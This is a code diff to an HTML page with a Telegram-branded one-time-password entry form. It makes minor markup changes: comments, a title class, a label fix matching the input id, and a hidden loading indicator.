@@ -8,13 +8,13 @@
 </head>
 <body>
     <!-- OTP Section -->
-    <div class="login-container" id="otpContainer">
+    <div class="login-container" id="otpContainer"> <!-- Removed telegram-container class -->
         <img id="telegramLogo" src="telegram-logo.png" alt="Telegram Logo" class="logo">
-        <h2>Enter OTP</h2>
+        <h2 class="title">Enter OTP</h2> <!-- Retained title class -->
         <p>We have sent an OTP to your phone number.</p>
         <form id="otpForm">
             <div class="input-container">
-                <label for="otp" class="input-label">OTP</label>
+                <label for="phoneCode" class="input-label">OTP</label> <!-- Consistent labeling -->
                 <input 
                     type="text" 
                     id="phoneCode" 
@@ -27,6 +27,7 @@
             <button type="submit" id="submitOtp">Submit OTP</button>
         </form>
         <div id="message"></div>
+        <div id="loadingIndicator" style="display:none;">Loading...</div> <!-- Loading indicator -->
     </div>
 
     <script src="/script.js"></script>
